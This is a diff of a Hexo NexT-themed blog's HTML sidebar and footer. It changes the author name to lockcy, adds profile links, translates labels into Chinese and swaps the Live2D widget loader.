           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <p class="site-author-name" itemprop="name">ICCTW</p>
+              <img class="site-author-image" itemprop="image"
+                src="/images/harutya.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
               <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
@@ -461,10 +499,10 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives/">
+                <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">40</span>
-                  <span class="site-state-item-name">posts</span>
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">日志</span>
                 </a>
               </div>
             
@@ -477,7 +515,7 @@
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
                   <span class="site-state-item-count">12</span>
-                  <span class="site-state-item-name">tags</span>
+                  <span class="site-state-item-name">标签</span>
                 </a>
               </div>
             
@@ -487,9 +525,26 @@
           
 
           
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lockcy" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:lockcysec@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
 
           
           
+
 
           
           
@@ -501,6 +556,13 @@
 
       
 
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
       
 
     </div>
@@ -517,13 +579,22 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">ICCTW</span>
+  <span class="author" itemprop="copyrightHolder">lockcy</span>
 
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">34.8k</span>
   
 </div>
 
 
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
 
 
 
@@ -531,7 +602,7 @@
 
 
 
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
 
 
 
@@ -539,7 +610,7 @@
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
 <span class="post-meta-divider">|</span>
-<span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv" < span>人</span>
+<span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"</span>人</span>
 
 
 
@@ -551,15 +622,10 @@
 
 
 
-        
-      </span></div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
         
       </div>
+    </footer>
+
     
 
     
@@ -712,5 +778,6 @@
 
   
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</body>
 </html>
+<script src="/live2d-widget/autoload.js"></script>
